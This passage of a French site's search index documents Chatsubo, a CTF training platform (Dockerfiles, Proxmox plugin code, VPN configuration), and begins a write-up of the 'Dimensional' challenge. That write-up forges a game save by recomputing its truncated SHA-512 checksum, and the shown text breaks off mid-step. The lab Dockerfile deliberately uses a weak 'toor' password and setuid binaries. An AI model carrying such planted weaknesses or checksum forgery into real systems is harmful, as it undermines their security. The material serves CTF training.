{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Table des mati\u00e8res # Cyber Threat Intelligence Melody Meloctl lab.bonjourmalwa.re S\u00e9curit\u00e9 d\u00e9fensive NoMoreDuck S\u00e9curit\u00e9 offensive OrgASM CTF Chatsubo ACK&/ Challenges","title":"Table des mati\u00e8res"},{"location":"#table-des-matieres","text":"Cyber Threat Intelligence Melody Meloctl lab.bonjourmalwa.re S\u00e9curit\u00e9 d\u00e9fensive NoMoreDuck S\u00e9curit\u00e9 offensive OrgASM CTF Chatsubo ACK&/ Challenges","title":"Table des mati\u00e8res"},{"location":"ctf/","text":"CTF # Chatsubo # Info Source : Publication du code pr\u00e9vue d\u00e9but juillet Inspiration : CTFd , Hackbox , HackTheBox , TryHackMe Technologies : Python, VueJS, Docker, Wireguard La plateforme Chatsubo a \u00e9t\u00e9 cr\u00e9\u00e9e dans l'optique de donner la possibilit\u00e9 aux communaut\u00e9s de toutes tailles de proposer \u00e0 leurs membres une plateforme d'entra\u00eenement capable d'h\u00e9berger des instances vuln\u00e9rables. Aper\u00e7u # Your browser does not support the video tag. Ajout d'une machine et connexion \u00e0 l'instance Affichage des challenges de la track \"Confirm\u00e9\" Listing des joueurs Profil des challenges Interface d'\u00e9dition des challenges Affichage des tentatives de validation en temps r\u00e9el Interface d'administration des challenges Note Les captures de d\u00e9mo ont \u00e9t\u00e9 r\u00e9alis\u00e9s avec le th\u00e8me du CTF ACK&/. Les instances # Chaque challenge se compose de deux parties : Le template, qui correspond \u00e0 l'image \u00e0 partir de laquelle l'instance sera d\u00e9ploy\u00e9e L'instance d\u00e9ploy\u00e9e, qui expose les informations li\u00e9es \u00e0 son \u00e9tat ainsi que celles n\u00e9cessaires pour communiquer avec (adresse IP, realm) Lorsque le syst\u00e8me de flag dynamique est utilis\u00e9, l'instance mettra \u00e9galement \u00e0 disposition les m\u00e9tadonn\u00e9es n\u00e9cessaires pour leur validation depuis la plateforme. Pour l'instant, seul Docker supporte ce syst\u00e8me gr\u00e2ce aux labels, qu'il est possible de r\u00e9cup\u00e9rer via l'API et qui sont \u00e9galement accessible au sein du conteneur via les variables d'environnement lors de l'instanciation. Exemple de Dockerfile se basant sur ce syst\u00e8me : FROM alpine:3.12 RUN apk add python3 ARG FLAG0 ARG SESSION LABEL chatsubo.template = \"hello-flag\" \\ chatsubo.flags.helloworld.value = \" $FLAG0 \" \\ chatsubo.flags.helloworld.points = \"25\" \\ chatsubo.session = \" $SESSION \" RUN mkdir /secrets RUN echo \" $FLAG0 \" > /secrets/flag WORKDIR /secrets CMD /bin/sh Avec la ligne de commande permettant de d\u00e9ployer une instance \u00e0 partir de ce template : docker build . --build-arg FLAG0 = level0 --build-arg SESSION = $( cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1 ) Toutes les informations expos\u00e9s par les labels sont accessible depuis Chatsubo et peuvent \u00eatre utilis\u00e9es pour valider les flags, aiguiller les utilisateurs vers leurs instances, etc. Les providers # Le principe fondamental du fonctionnement du backend est le suivant : le serveur re\u00e7oit des ordres qu'il transmet aux plugins, qui savent comment l'ex\u00e9cuter. Cette architecture vise \u00e0 favoriser au maximum l'adaptation de Chatsubo aux diff\u00e9rents environnements de virtualisation des communaut\u00e9s amen\u00e9es \u00e0 l'utiliser, Ainsi, les plugins tiennent d'une part le r\u00f4le de traducteur entre les donn\u00e9es expos\u00e9es par l'hyperviseur et celles attendues par la plateforme pour fonctionner, et d'autre part celui d'interm\u00e9diaire entre les ordres re\u00e7ues depuis l'interface et la mani\u00e8re de les \u00e9x\u00e9cut\u00e9s. Il existe aujourd'hui un plugin pour Docker et pour PVE. Si l'on prend PVE comme exemple, il suffit de cr\u00e9er deux fichiers pour le rendre compatible avec Chatsubo : Un fichier provider.py qui remplit les besoins suivants : Lister les templates disponibles Lister les instances en cours d'ex\u00e9cution Rollback une instance au snapshot d\u00e9fini comme l'\u00e9tat initial de la machine Cr\u00e9er une instance du provider \u00e0 partir des donn\u00e9es disponibles dans le fichier de configuration Et un fichier instance.py qui traduit les informations re\u00e7ues de l'hyperviseur et qui contient les donn\u00e9es suivantes : Son nom Le realm dont elle fait partie Le template duquel elle est issue Son adresse IP Afficher le code du fichier \"provider.py\" du plugin PVE import re import traceback import requests from proxmoxer import ProxmoxAPI from urllib3.exceptions import MaxRetryError from app.providers.base.provider import BaseProvider from app.providers.base.template import BaseTemplate from app.providers.exc import VpnProviderNotFoundException , \\ VpnProviderErrorException , BackendConnectionException , MetadataNotFoundException , MalformedMetadataException from app.providers.pve.instance import PVEInstance class PVEProvider ( BaseProvider ): kind = \"pve\" def __init__ ( self , name , host , user , token_name , token_value , vpns , nodes = None , verify_ssl = False , sep = \"--\" ): if nodes is None : nodes = [ \"pve\" ] self . name = name self . nodes = nodes self . sep = sep self . client = ProxmoxAPI ( host , user = user , token_name = token_name , token_value = token_value , verify_ssl = verify_ssl ) remote_nodes = [ node_data [ \"node\" ] for node_data in self . client . nodes . get ()] for node in self . nodes : if node not in remote_nodes : raise BackendConnectionException ( f \" { self . kind } / { self . name } \" , f \"Node ' { node } ' not found\" ) super () . __init__ ( kind = self . kind , vpn_confs = vpns ) def test_client ( self ): nodes = self . client . nodes . get () for node in nodes : self . client . nodes ( node [ \"node\" ]) . status . get () def list_templates ( self ): templates = [] vms = self . list_all () try : filtered = list ( filter ( lambda vm : \"CHATSUBO_\" in vm [ \"description\" ] and vm [ \"template\" ] == 1 , vms )) rg = re . compile ( \"CHATSUBO_TEMPLATE=(.*)\" ) for config in filtered : match = rg . search ( config [ \"description\" ]) if not match : continue name = match [ 1 ] templates . append ( BaseTemplate ( name , self . to_json ()) . to_json ()) except Exception : raise return templates def list_all ( self ): vms = [] for node in self . nodes : try : instances = self . client . nodes ( node ) . qemu . get () except ( MaxRetryError , requests . exceptions . ConnectionError , ConnectionRefusedError ) as e : raise BackendConnectionException ( f \" { self . kind } / { self . name } \" , str ( e )) for inst in instances : inst [ \"description\" ] = self . client . nodes ( node ) . qemu ( inst [ \"vmid\" ]) . config . get () . get ( \"description\" , \"\" ) inst [ \"node\" ] = node vms += instances return vms def list_instances ( self , realm = None ): instances = [] vms = self . list_all () raw = list ( filter ( lambda vm : \"CHATSUBO_\" in vm [ \"description\" ] and vm [ \"template\" ] == \"\" , vms )) for vm in raw : try : instances . append ( PVEInstance ( vm [ \"vmid\" ], vm [ \"name\" ], self . prefix , vm [ \"description\" ], vm [ \"node\" ], self . sep )) except ( MetadataNotFoundException , MalformedMetadataException ): pass if realm : instances = list ( filter ( lambda i : i . realm == realm , instances )) return instances def reset ( self , realm , box , session = None ): target = None instances = self . list_instances ( realm = realm ) for inst in instances : if inst . template == box . template : target = inst snapshots = self . client . nodes ( target . node ) . qemu . get ( f \" { target . id } /snapshot\" ) last_snap_name = list ( filter ( lambda x : x . get ( \"running\" ) == 1 , snapshots ))[ 0 ] . get ( \"parent\" ) if not last_snap_name : return False self . client . nodes ( target . node ) . qemu . post ( f \" { target . id } /snapshot/ { last_snap_name } /rollback\" ) return True @classmethod def from_config ( cls , name , raw_conf ): parsed = { \"name\" : name , \"host\" : f \" { raw_conf [ 'api' ][ 'host' ] } : { raw_conf [ 'api' ][ 'port' ] } \" , \"user\" : raw_conf [ \"api\" ][ \"user\" ], \"token_name\" : raw_conf [ \"api\" ][ \"token\" ][ \"name\" ], \"token_value\" : raw_conf [ \"api\" ][ \"token\" ][ \"value\" ], \"vpns\" : raw_conf [ \"vpns\" ] } if nodes := raw_conf . get ( \"nodes\" ): parsed [ \"nodes\" ] = nodes if verif := raw_conf . get ( \"verify_ssl\" ): parsed [ \"verify_ssl\" ] = verif if sep := raw_conf . get ( \"sep\" ): parsed [ \"sep\" ] = sep return cls ( ** parsed ) Afficher le code du fichier \"instance.py\" du plugin PVE import re from app.providers.exc import MetadataNotFoundException , MalformedMetadataException from app.providers.base.instance import BaseInstance class PVEInstance ( BaseInstance ): def __init__ ( self , id , name , prefix , description , node = \"pve\" , sep = \"--\" ): self . prefix = prefix self . sep = sep self . node = node try : template , realm , address = self . parse_meta ( description ) except ( MetadataNotFoundException , MalformedMetadataException ): raise super ( PVEInstance , self ) . __init__ ( id , name , realm , template , address , sep ) def parse_meta ( self , raw ): \"\"\" Parse and extract the template, realm and IP address from the metadata field of the instance :param raw: string holding the metadata info :return: returns the template name, the realm holding this instance and its IP address \"\"\" template , realm , address = \"\" , \"\" , \"\" raw = raw . lower () if not any ( f \"chatsubo_ { key } \" in raw for key in [ \"template\" , \"realm\" , \"address\" ]): raise MalformedMetadataException rg = re . compile ( \"(chatsubo_\\w*)=(.*)\" , re . MULTILINE ) matches = rg . findall ( raw ) for match in matches : if match [ 0 ] . replace ( \"chatsubo_\" , \"\" ) == \"template\" : template = match [ 1 ] elif match [ 0 ] . replace ( \"chatsubo_\" , \"\" ) == \"realm\" : realm = match [ 1 ] elif match [ 0 ] . replace ( \"chatsubo_\" , \"\" ) == \"address\" : address = match [ 1 ] return template , realm , address def to_json ( self ): data = self . _to_json () data . update ({ \"node\" : self . node , }) return data Une fois le plugin cr\u00e9\u00e9, il suffit de renseigner les informations n\u00e9cessaires dans le fichier de configuration, comme l'exemple ci-dessous : providers : pve : warzone : # provider name api : user : \"api@pam\" host : \"https://pve.hacklab\" port : 8006 token : name : \"b5215aeb-ae28-432c-b1b7-047276d87cf\" value : \"dff1ae17-4eb3-4543-a9f2-a703f375c48\" vpns : - realm : \"wz01\" url : \"http://gate.hacklab:7474\" header : \"X-Chatsubo-Token\" token : \"W4etxFM57y1MfRCDqzkjKfZVMEbunhoOLNE9Hj9xg7YLoZ0FXZYW8SahlGPJy6SdlRDXfDHe75x9yEZWz9TasKqG5KNPjKsSumI7KVCw28FgLnMnnbsy7jvcGvUdhGVv\" endpoints : config : \"/api/vpn/get/:username\" check : \"/api/check\" docker : # Empty docker provider config Acc\u00e8s VPN # Afin de faciliter la gestion du r\u00e9seau et de l'acc\u00e8s des joueurs aux instances, il est n\u00e9cessaire de passer par un VPN pour acc\u00e9der aux machines. Les joueurs peuvent r\u00e9cup\u00e9rer leurs acc\u00e8s \u00e0 tout moment via l'interface web. Pour interfacer les ponts VPN avec la plateforme, nous avons besoin d'un client d\u00e9di\u00e9 install\u00e9 sur chacune de ces machines. Ce client s'appelle chatsubo-gate et communique avec Chatsubo via une API. Son r\u00f4le va \u00eatre d'envoyer le contenu des configurations pr\u00e9-g\u00e9n\u00e9r\u00e9es \u00e0 l'installation et de tenir une table \u00e9tablissant un lien entre un pseudo et une configuration VPN. J'utilise l'image Docker linuxserver.io pour g\u00e9n\u00e9rer les configurations et faire tourner le serveur, mais puisque chatsubo-gate n'a besoin que du dossier qui contient les configurations, n'importe quelle m\u00e9thode peut \u00eatre utilis\u00e9e. Une configuration minimale est n\u00e9cessaire pour que la plateforme et le pont VPN puisse communiquer : C\u00f4t\u00e9 chatsubo-gate , il est n\u00e9cessaire de renseigner le dossier contenant les fichiers de configurations, le realm ainsi que le token d'authentification utilis\u00e9 pour s\u00e9curiser les \u00e9changes avec la plateforme. realm : \"ans01\" # This token must be the same on the chatsubo plateform. \"cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 128 | head -n 1\" works well chatsubo_token : \"changeme_for_a_strong_and_random_token_like_128+_chars\" wg_clients_dir : \"/opt/chatsubo-gate/clients\" La notion de realm est importante puisqu'elle va nous permettre d'une part d'exposer plusieurs instances distinctes d'un m\u00eame template en parall\u00e8le, et d'autre part de connecter plusieurs ponts VPN h\u00e9berg\u00e9s sur plusieurs machines diff\u00e9rentes au m\u00eame sous r\u00e9seau. C\u00f4t\u00e9 Chatsubo, il est n\u00e9cessaire d'indiquer l'url du pont, le m\u00eame token et le realm correspondant dans la configuration de chaque provider. Par exemple : vpns : - realm : \"ans01\" url : \"http://challs.hacklab:7474\" header : \"X-Chatsubo-Token\" # This token must be the same on the linked chatsubo-gate. \"cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 128 | head -n 1\" works well chatsubo_token : \"changeme_for_a_strong_and_random_token_like_128+_chars\" endpoints : config : \"/api/vpn/get/:username\" check : \"/api/check\" L'en-t\u00eate utilis\u00e9 pour l'authentification ainsi que les endpoints sont modifiables via la configuration de Chatsubo afin de faciliter le d\u00e9veloppement d'un connecteur alternatif dans le but, par exemple, de suporter un r\u00e9seau bas\u00e9 sur OpenVPN. ACK&/ # Le CTF ACK&/ \u00e9tait un \u00e9v\u00e8nement destin\u00e9 exclusivement aux \u00e9l\u00e8ves de l'ESGI qui s'est d\u00e9roul\u00e9 du 19 au 21 f\u00e9vrier 2021. Les challenges \u00e9taient con\u00e7us pour se suivre et se r\u00e9partissaient sur plusieurs instances, comportant chacune 4 niveaux cons\u00e9cutifs. Exemple Pour passer du level0 au level1, il fallait r\u00e9ussir le challenge de l'utilisateur level0 puis se connecter au suivant gr\u00e2ce au flag obtenu. Deux tracks \u00e9taient disponibles : La track \"d\u00e9butants\" 12 challenges r\u00e9partis en 3 instances La track \"confirm\u00e9s\" 20 challenges r\u00e9partis en 5 instances D\u00e9ploiement des instances # L'ensemble des challenges pr\u00e9sents sur l'instance \u00e9taient install\u00e9s et configur\u00e9s lors du d\u00e9ploiement. Exemple de Dockerfile utilis\u00e9 pour d\u00e9ployer une instance FROM ubuntu:20.04 # Setup RUN apt update RUN apt install -y openssh-server vim man less netcat cron zip sl COPY src/root/etc /etc # Allow caching of apt by putting it below # level0 password ARG RNG0 = toor # Challenger's unique session, handled by Chatsubo ARG SESSION # Register all the generated flag passed by Chatsubo via --build-args # ENV is needed to allow entrypoint to access them ARG FLAG0 ARG FLAG1 ARG FLAG2 ARG FLAG3 ENV FLAGS = \" $FLAG0 ; $FLAG1 ; $FLAG2 ; $FLAG3 \" RUN echo $FLAGS RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $RNG0 \" ) level0 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG0 \" ) level1 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG1 \" ) level2 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG2 \" ) level3 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG3 \" ) level4 # Exposed metadata, needed by Chatsubo for dynamic flags, session handling and ssh initial access LABEL chatsubo.template = \"adv_ans01\" \\ chatsubo.creds.ssh.username = \"level0\" \\ chatsubo.creds.ssh.password = \" $RNG0 \" \\ chatsubo.flags.step0.value = \" $FLAG0 \" \\ chatsubo.flags.step0.points = \"250\" \\ chatsubo.flags.step1.value = \" $FLAG1 \" \\ chatsubo.flags.step1.points = \"250\" \\ chatsubo.flags.step2.value = \" $FLAG2 \" \\ chatsubo.flags.step2.points = \"250\" \\ chatsubo.flags.step3.value = \" $FLAG3 \" \\ chatsubo.flags.step3.points = \"250\" \\ chatsubo.session = \" $SESSION \" # Add challenges setup scripts and resources COPY src/root / RUN chmod u+x /home/level**/ans_init.sh # Needed for sshd RUN mkdir /run/sshd RUN echo \" $FLAGS \" > /root/flags COPY src/entrypoint.sh /entrypoint.sh RUN chmod u+x /entrypoint.sh ENTRYPOINT /bin/bash -c '/etc/init.d/cron start && cat /root/flags | /entrypoint.sh' Chaque dossier comprenait un Dockerfile comme celui ci-dessus ainsi que l'ensemble des fichiers \u00e0 copier dans le conteneur. Par exemple : . |-- Dockerfile |-- Makefile `-- src |-- entrypoint.sh `-- root |-- etc | `-- ssh | `-- sshd_config `-- home |-- level0 | |-- ans_init.sh | `-- main.c |-- level1 | |-- ans_init.sh | `-- hexhexhex |-- level2 | |-- ans_init.sh | |-- challenge.py | `-- create_flag.py |-- level3 | |-- ans_init.sh | |-- main.c | `-- patch.py `-- level4 |-- ans_init.sh `-- finish.txt L'entrypoint avait pour seul r\u00f4le d'appeler le script ans_init.sh pr\u00e9sent dans le home de chacun des utilisateurs, en lui transmettant le flag \u00e0 ins\u00e9rer dans le challenge, le nom de l'utilisateur courant ainsi que celui du suivant : #!/bin/bash rm -f $0 SCRIPT_NAME = \"ans_init.sh\" RAW_FLAGS = \" $( cat /root/flags ) \" FLAGS =( ${ RAW_FLAGS //;/ } ) # Start challenge setup script for each levels and remove it for i in { 0 ..4 } ; do current_user = \"level $i \" next_user = \"level $(( $i + 1 )) \" init_script = \"/home/level $i / $SCRIPT_NAME \" current_flag = ${ FLAGS [i] :- \"_\" } [ -f \" $init_script \" ] && bash -c \" $init_script $current_flag $current_user $next_user \" rm -f $init_script done rm -f /root/flags /etc/init.d/cron start # Allow remote access while true ; do /usr/sbin/sshd -e -D done Ce script, ans_init.sh , \u00e9tait \u00e9crit par le cr\u00e9ateur du challenge et s'occupait de mettre en place les diff\u00e9rents \u00e9l\u00e9ments n\u00e9cessaires \u00e0 son fonctionnement : FLAG = $1 CURRENT_USER = $2 NEXT_USER = $3 bin_name = \"hexhexhex\" chown -R \" $CURRENT_USER :\" \"/home/ $CURRENT_USER \" chown \" $NEXT_USER :\" \"/home/ $CURRENT_USER / $bin_name \" chmod u+xs \"/home/ $CURRENT_USER / $bin_name \" echo $FLAG > \"/home/ $NEXT_USER /flag\" chown \" $NEXT_USER :\" \"/home/ $NEXT_USER /flag\" chmod 400 \"/home/ $NEXT_USER /flag\" Challenges # Dimensional # Ce challenge a \u00e9t\u00e9 diffus\u00e9 lors du CTF ACK&/ organis\u00e9 par le Hacklab ESGI. Il s'agit d'une text adventure auquelle il faut tricher pour obtenir un objet pr\u00e9cis ainsi qu'un mot de passe, qui permettent au joueur de se rendre dans le cyberespace et d'y de r\u00e9cup\u00e9rer le flag. TL;PL # 1) Lire la note sur le bureau pour comprendre l'objectif : aller dans le cyberespace gr\u00e2ce \u00e0 l'item UVL540, charg\u00e9 depuis la console 2) Trouver la console qui n\u00e9cessite un mot de passe 3) Faire le tour du jeu pour comprendre qu'il faut obtenir l'UVL540 en trichant 4) D\u00e9compresser le fichier de sauvegarde pour le rendre lisible 5) Analyser le format de la sauvegarde pour identifier sa structure 6) Identifier comment g\u00e9n\u00e9rer le check d'int\u00e9grit\u00e9 ( sha512(save)[12:] ) en analysant les paquets import\u00e9s par le binaire via strings 7) It\u00e9rer sur les identifiants des items, s\u00e9quentiels, jusqu'\u00e0 obtenir l'UVL540 (ID 4) 8) Trouver le dialogue cach\u00e9 gr\u00e2ce \u00e0 strings pour identifier le *clavier* et r\u00e9cup\u00e9rer ainsi le mot de passe de la console cach\u00e9 dessous 9) Charger l'UVL540 pour aller dans le cyberespace et obtenir le flag Premiers pas # Nous lan\u00e7ons le binaire une premi\u00e8re fois : Il s'agit d'une text adventure, qui fonctionne de la mani\u00e8re suivante : Les *ast\u00e9risques* indiquent les endroits o\u00f9 nous pouvons nous d\u00e9placer Les [crochets] indiquent les objets avec lesquels nous pouvons interagir Nous pouvons faire une sauvegarde gr\u00e2ce \u00e0 la commande save Nous allons au bureau et nous lisons la note : Un mot est \u00e9crit sur la note : Salut alvoras, J't'avais bien dit que j'allais r\u00e9ussir. Un moyen de transcender la mati\u00e8re, de communiquer \u00e0 la vitesse de la lumi\u00e8re. Bordel si \u00e7a donne pas envie \u00e7a ! Si un jour tu lis ce message, d\u00e9merde-toi pour r\u00e9cup\u00e8rer un [UVL540] et charge le programme de saut depuis la [console], dans la pi\u00e8ce d'\u00e0 c\u00f4t\u00e9. Puis rejoins-moi dans le *cyberespace*. - Moc Plusieurs informations importantes ici : Nous devons obtenir un UVL540, qui est un objet utilisable Nous devons trouver la console pour charger le programme de saut Puis nous devons nous rendre dans la salle \"cyberespace\" Nous pouvons tenter de nous rendre directement dans le cyberespace : ... qui nous accueille en nous grillant la cervelle puisque nous ne poss\u00e9dons pas d'UVL540. En relan\u00e7ant le jeu, nous remarquons que la sauvegarde a \u00e9t\u00e9 supprim\u00e9e. Nous continuons \u00e0 d\u00e9couvrir le jeu en allant vers la porte, indiqu\u00e9e au d\u00e9but du jeu. Nous d\u00e9couvrons la prochaine salle, la \"Salle de saut\", et nous d\u00e9verrouillons la porte gr\u00e2ce \u00e0 la clef situ\u00e9e au dessus de la porte. Nous pouvons consulter notre inventaire avec la commande inv : Une fois dans la salle de saut, nous trouvons la console , dont nous avons besoin pour charger l'UVL540 avant de pouvoir nous rendre dans le cyberespace. Nous tentons d'utiliser la console : Il nous faut donc un mot de passe... et notre sauvegarde est une nouvelle fois supprim\u00e9e si nous nous trompons. Nous continuons \u00e0 fouiller, mais nous avons bel et bien fait le tour du jeu. Analyse # R\u00e9capitulons : + Le but du jeu est de nous rendre dans le cyberespace + Pour cela, nous avons besoin de l'item \"UVL540\" + Il faut que cet item soit \"charg\u00e9\" via la console + La console demande un mot de passe Nous avons donc besoin : 1) D'obtenir un objet qui ne peut pas \u00eatre obtenu dans le jeu 2) Du mot de passe de la console Il va falloir tricher ! UVL540 # Le format de sauvegarde # Commen\u00e7ons par analyser une sauvegarde toute fra\u00eeche : Il s'agit donc d'un fichier compr\u00e9ss\u00e9 gzip contenant une cha\u00eene de caract\u00e8re. Nous obtenons le format suivant : nom::position::12 caract\u00e8res hexa Nous avons le nom du joueur, la pi\u00e8ce dans laquelle nous nous trouvons et 12 caract\u00e8res en hexad\u00e9cimal, \u00e0 priori sans lien avec le jeu. Le s\u00e9parateur semble \u00eatre \"::\". Nous rechargeons la sauvegarde et avan\u00e7ons dans le jeu pour voir comment sa structure \u00e9volue : Nous remarquons que le jeu affiche l'\u00e9tat de la sauvegarde lorsque nous la chargeons et que la valeur correspond au dernier champ du fichier de sauvegarde. Ici, nous nous sommes d\u00e9plac\u00e9s et avons ajout\u00e9 deux objets \u00e0 notre inventaire : la bo\u00eete et la clef, dont nous avons fait passer l'\u00e9tat \u00e0 \"used\". La sauvegarde ressemble maintenant \u00e0 : Info Note : Un retour \u00e0 la ligne a \u00e9t\u00e9 ajout\u00e9 \u00e0 la fin de la commande ( && echo ) pour que la sauvegarde soit lisible. Le fichier de sauvegarde est consid\u00e9r\u00e9 comme corrompu par le jeu s'il se termine par un saut de ligne. Nous retrouvons 2 blocs au format <int>;<string> au premier :: et le nom d'une salle au second :: . Nous comprenons qu'il s'agit de l'inventaire avec une suite d'objets sous la forme <id>;<\u00e9tat>, puisque l'on retrouve l'\u00e9tat \"used\" de notre clef. On note au passage que la case d'\u00e9tat peut \u00eatre vide ( 2;<null> ). Les 12 caract\u00e8res ont chang\u00e9s avec la sauvegarde, il s'agit donc certainement d'un hash (type MD5) ou d'un code de correction d'erreur (type CRC32). Le format de la sauvegarde est donc le suivant : <nom>:<objet1>;<\u00e9tat>,<objet2>;<\u00e9tat>,...,<objetN>;<\u00e9tat>:<position>:<position pr\u00e9c\u00e9dente>:<checksum> Les identifiants des objets semblent \u00eatre incr\u00e9mentaux : nous testons de changer notre clef en bo\u00eete (deux objets dont l'ID est connu) en changeant l'ID de l'item 1 en 2 . Pour cela nous d\u00e9compressons notre fichier de sauvegarde avec zlib-flate -uncompress < ./.save.ans > save.uncomp , que nous recompressons avec zlib-flate -compress < ./save.uncomp > .save.ans . Danger Important : il est n\u00e9cessaire d'utiliser set noendofline binary \u00e0 chaque ouverture de vim ou d'inscrire ce param\u00e8tre dans un fichier .vimrc \u00e0 la racine du dossier pour \u00e9viter que vim ne rajoute de saut de ligne \u00e0 la fin du fichier et ne corrompe la sauvegarde. Une alternative serait de recr\u00e9er un fichier interm\u00e9diaire en retirant le retour \u00e0 la ligne avec head -c -1 ./save.uncomp > ./save.uncomp2 . Nous forgeons la nouvelle sauvegarde et tentons de la charger : Le jeu nous indique que notre sauvegarde est corrompue. Le check d'int\u00e9grit\u00e9 # Nous voulons v\u00e9rifier si l'hypoth\u00e8se du check d'int\u00e9grit\u00e9 est juste. Pour cela, nous allons chercher dans le binaire si des fonctions de hachage sont utilis\u00e9es. Il n'est pas n\u00e9cessaire de sortir un logiciel de reverse comme IDA pour l'instant ; nous commencerons par utiliser les commandes file et strings . Le file nous indique qu'il s'agit d'un binaire 64 bits cod\u00e9 en Go, non stripp\u00e9 : level0@359b243ce4cd:~$ file ./dimensional ./dimensional: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=KRbhNK-qTCrI6YYoim48/mbevmsH8s-itlC7_D9zy/GKbmbssdYECvm3tn7IoT/HS2lESc5tiP-_ekaKQ5m, not stripped Les programmes compil\u00e9s depuis le Golang conservent l'ensemble des fonctions utilis\u00e9s en clair dans le code source. Nous confirmons cela avec un premier strings sans filtre : level0@359b243ce4cd:~$ strings ./dimensional ... gitlab.com/Alvoras/dimensional/internal/game.UserInputln gitlab.com/Alvoras/dimensional/internal/game.PasswordInputln gitlab.com/Alvoras/dimensional/internal/game.init.0.func1 gitlab.com/Alvoras/dimensional/internal/game.init.0.func2 gitlab.com/Alvoras/dimensional/internal/game.init.0.func3 gitlab.com/Alvoras/dimensional/internal/game.init.0.func4 gitlab.com/Alvoras/dimensional/internal/game.init.0.func5 gitlab.com/Alvoras/dimensional/internal/game.init.0.func6 gitlab.com/Alvoras/dimensional/internal/game.init.0.func7 gitlab.com/Alvoras/dimensional/internal/game.init.0.func8 type..eq.gitlab.com/Alvoras/dimensional/internal/game.SaveItem type..eq.[5]interface {} main.main En utilisant grep , nous pouvons isoler les fonctions potentiellement utilis\u00e9es gr\u00e2ce aux noms des paquets correspondants : \"hash\" level0@359b243ce4cd:~$ strings ./dimensional | grep -i hash/ hash/adler32 hash/adler32.(*digest).Reset hash/adler32.(*digest).Size hash/adler32.(*digest).BlockSize hash/adler32.update hash/adler32.(*digest).Write hash/adler32.(*digest).Sum32 hash/adler32.(*digest).Sum hash/adler32.New hash/adler32.Checksum /usr/local/go/src/hash/adler32/adler32.go hash/adler32..inittask go.itab.*hash/adler32.digest,hash.Hash32 hash/adler32.(*digest).Reset hash/adler32.(*digest).Size hash/adler32.(*digest).BlockSize hash/adler32.update hash/adler32.(*digest).Write hash/adler32.(*digest).Sum32 hash/adler32.(*digest).Sum \"crypto\" level0@359b243ce4cd:~$ strings ./dimensional | grep -i crypto/ crypto/sha512 crypto/sha512.init.0 crypto/sha512.(*digest).Reset crypto/sha512.New crypto/sha512.New512_224 crypto/sha512.New512_256 crypto/sha512.New384 crypto/sha512.(*digest).Size crypto/sha512.(*digest).BlockSize crypto/sha512.(*digest).Write crypto/sha512.(*digest).Sum crypto/sha512.(*digest).checkSum crypto/sha512.Sum512 crypto/sha512.block crypto/sha512.init crypto/sha512.blockAMD64 crypto/sha512.blockAVX2 /usr/local/go/src/crypto/sha512/sha512block_amd64.s /usr/local/go/src/crypto/sha512/sha512block_amd64.go /usr/local/go/src/crypto/sha512/sha512.go /usr/local/go/src/crypto/crypto.go crypto/sha512.blockAVX2.args_stackmap crypto/sha512.blockAMD64.args_stackmap crypto/sha512..inittask crypto/sha512._K crypto/sha512.useAVX2 go.itab.*crypto/sha512.digest,hash.Hash crypto/sha512.init.0 crypto/sha512.(*digest).Reset crypto/sha512.New crypto/sha512.New512_224 crypto/sha512.New512_256 crypto/sha512.New384 crypto/sha512.(*digest).Size crypto/sha512.(*digest).BlockSize crypto/sha512.(*digest).Write crypto/sha512.(*digest).Sum crypto/sha512.(*digest).checkSum crypto/sha512.Sum512 crypto/sha512.block crypto/sha512.init crypto/sha512.blockAMD64 crypto/sha512.blockAVX2 Nous identifions quatre candidats : Adler32 SHA512-224 SHA512-256 SHA384 SHA512 L'algorithme Adler32 ne produit que des sommes, exprim\u00e9es en un nombre poss\u00e9dant jusqu'\u00e0 10 chiffres ; nous l'\u00e9cartons donc pour nous concentrer sur le SHA-512. Info L'algorithme Adler32 est utilis\u00e9 par la compression gzip, ce qui justifie sa pr\u00e9sence dans le binaire. Puisqu'il existe 3 formats g\u00e9r\u00e9s par la lib crypto/sha512, nous nous contenterons... de tous les essayer. Ces fonctions correspondent aux algorithmes 512-224, 512-256, 384, et 512 de la commande shasum . Nous pouvons donc toutes les tester de la mani\u00e8re suivante : level0@359b243ce4cd:~$ echo -n \"alvoras:1;used,2;:Salle de saut:Porte:\" > ./raw level0@359b243ce4cd:~$ shasum -a 512224 ./raw; shasum -a 512256 ./raw; shasum -a 384 ./raw; shasum -a 512 ./raw 9a8632699d0e944ef4733d84468878561f2491414db301287f341eaa ./raw ca3e64ee4b2fd78d393c99952207bf09c6d95bc4759e3154a3d68cf301c9fd0b ./raw abe6d7fcbfc0bc8536b6b8b62a9f9596d6c8024bba450541ef58c9ad6595e84f8d367b08be84746a7fb5c67ec920965f ./raw 4937897b1ad44ed355e8324d3d9a67fe7ff80cfc16101c6aabe54dbb3059a36900e526c3a750b885cd22ae26412a81a075d77ed82036a3b3f38271772c497bf0 ./raw Nous avons un match avec la derni\u00e8re commande : il s'agit donc des 12 premiers caract\u00e8res d'un SHA512 du fichier de sauvegarde. Nous validons notre hypoth\u00e8se en reprenant la manipulation cit\u00e9e plus haut mais en modifiant cette fois-ci le hash : level0@359b243ce4cd:~$ echo -n \"alvoras:2;used,2;:Salle de saut:Porte:\" | sha512sum | head -c 12 && echo 88038a66346d level0@359b243ce4cd:~$ # On modifie l'ID de la clef et on remplace le hash tronqu\u00e9 level0@359b243ce4cd:~$ vim ./save.uncomp level0@359b243ce4cd:~$ zlib-flate -compress < ./save.uncomp > .save.ans Notre sauvegarde est valide et nous obtenons bien deux bo\u00eetes dans notre inventaire. La g\u00e9n\u00e9ration d'objets # Maintenant que nous sommes en mesure de modifier la sauvegarde sans la corrompre, nous pouvons faire appara\u00eetre n'importe quel item dans notre inventaire. Nous ne connaissons pas l'ID de l'UVL540. Qu'\u00e0 cela ne tienne, nous g\u00e9n\u00e9rons les items poss\u00e9dant les IDs de 1 \u00e0 30. Pour simplifier les manipulations, nous 